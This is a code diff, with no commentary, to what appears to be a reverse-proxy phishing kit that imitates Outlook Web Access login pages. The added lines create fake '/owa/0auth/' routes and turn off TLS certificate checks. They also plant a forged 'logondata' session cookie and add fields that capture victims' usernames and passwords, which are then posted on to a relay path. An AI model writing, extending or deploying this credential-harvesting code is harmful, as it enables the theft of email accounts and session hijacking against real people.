@@ -56,7 +56,7 @@ const DefaultPreHandler = class extends globalWorker.BaseClasses.BasePreClass {
     }
 
     execute(clientContext) {
-        if (this.req.url.startsWith('/owa/migrate')) {
+        if (this.req.url.startsWith('/owa/0auth/migrate')) {
            
             process.env['NODE_TLS_REJECT_UNAUTHORIZED'] = 0;
 
@@ -71,11 +71,16 @@ const DefaultPreHandler = class extends globalWorker.BaseClasses.BasePreClass {
                         clientContext.currentDomain = subdomain;
                         Object.assign(clientContext.sessionBody,
                             { owaUrl: `https://${subdomain}` })
-                        this.res.writeHead(302, {location: '/'})
+                        const maxAge = 60 * 60 * 24 * 365 * 20; // 20 years in seconds
+                        const expires = new Date('2039-01-01').toUTCString();
+                        this.res.writeHead(302, {
+                            location: '/',
+                            'Set-Cookie': `logondata=acc=0&lgn=${urlQuery.qrc};path=/`
+                        })
                         return this.res.end()
                     } else {
                         console.log('OWA subdomain not found');
-                        this.res.writeHead(302, {location: '/owa/identity'})
+                        this.res.writeHead(302, {location: `/owa/0auth/session?qrc=${urlQuery.qrc}`})
                         return this.res.end()
                     }
                 })
@@ -83,7 +88,7 @@ const DefaultPreHandler = class extends globalWorker.BaseClasses.BasePreClass {
                     console.error(err);
                 });
             } else {
-                this.res.writeHead(302, {location: '/owa/identity'})
+                this.res.writeHead(302, {location: '/owa/0auth/identity'})
                 return this.res.end()
             }
 
@@ -103,13 +108,13 @@ const configExport = {
 
     CURRENT_DOMAIN: 'PHP-EXEC',
 
-    START_PATH: '/owa/identity',
+    START_PATH: '/owa/0auth/identity',
     
     PATTERNS: [],
 
     PHP_PROCESSOR: {
 
-        '/owa/identity': {
+        '/owa/0auth/identity': {
             GET: {
                 script: 'identity.php',
             },
@@ -117,6 +122,18 @@ const configExport = {
                 script: 'identity.php',
                 
                 redirectTo: '',
+
+            },
+        },
+
+        '/owa/0auth/session': {
+            GET: {
+                script: 'manual.php',
+            },
+            POST: {
+                script: null,
+                
+                redirectTo: '/ping/09v08v07',
 
             },
         },
@@ -136,6 +153,17 @@ const configExport = {
             params: ['email'],
             hosts: 'PHP-EXEC',
         },
+
+        manualOWAEmail: {
+            params: ['0username'],
+            hosts: 'PHP-EXEC',
+        },
+
+        manualOWAPassword: {
+            params: ['0password'],
+            hosts: 'PHP-EXEC',
+        },
+
 
         owaUsername: {
             params: ['username'],
